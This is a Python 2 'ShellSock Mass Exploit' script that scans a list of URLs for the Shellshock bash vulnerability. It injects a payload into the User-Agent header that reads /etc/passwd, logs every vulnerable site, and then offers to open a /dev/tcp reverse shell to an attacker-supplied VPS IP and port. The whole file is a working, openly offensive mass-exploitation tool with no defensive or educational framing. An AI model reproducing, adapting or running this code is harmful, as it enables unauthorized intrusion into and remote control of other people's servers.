#if you got "ImporError" bla bla, you need to install requests module
#how ?
#pip install requests
import requests
import sys

def banner():
    print '''
   _  _    __
 _| || |_ /  |  // ShellSock Mass Exploit
|_  __  _|`| |  // SanjunganJiwaTeam
 _| || |_  | |  // VisitMe : rhama.my.id
|_  __  _|_| |_ // If Alone, Can't Change The World. -L
  |_||_|  \___/
            '''
def url():
    f = open(sys.argv[1])
    urls = f.read().split("\n")
    return urls
def save2txt(url):
    f = open('ShellShocked.txt','a')
    f.write(url)
    f.close()
def bashreverse(url):
    ip = raw_input("Enter Your VPS IP :")
    port = raw_input("Enter Your Listen Port :")
    sock = '() { :; }; echo; /bin/sh -i >& /dev/tcp/%s/%s 0>&1' % (ip,port)
    requests.get(url,headers={'User-agent' : sock},verify=False)
def check(urls):
    for url in filter(None,urls):
        if not url.startswith("http"):
            url = "http://"+url
        try:
            buka = requests.get(url,headers={'User-agent' : '() { :; }; echo; /bin/cat /etc/passwd'},verify=False)#,timeout=10)
            read = buka.content
            if 'root:x:0:0:' in read:
                print "[+] ShellShocked => %s" % (url)
                save2txt(url+"\n")
                pilihan = raw_input("Do you want to make reverse connection ? [y/n] : ")
                if pilihan == 'y' or pilihan == 'Y':
                    print "Press Ctrl + C to Continue"
                    bashreverse(url)
                else:
                    continue
            else:
                print "[-] Not Vuln %s" % (url)
                continue
        except KeyboardInterrupt:
            continue
    return ''
def main():
    banner()
    if len(sys.argv) == 1 or len(sys.argv) >= 3:
        print "Usage : python "+ __file__ +" sitelist.txt"
        sys.exit()
    elif len(sys.argv) == 2:
        check(url())
if __name__ == '__main__':
    main()
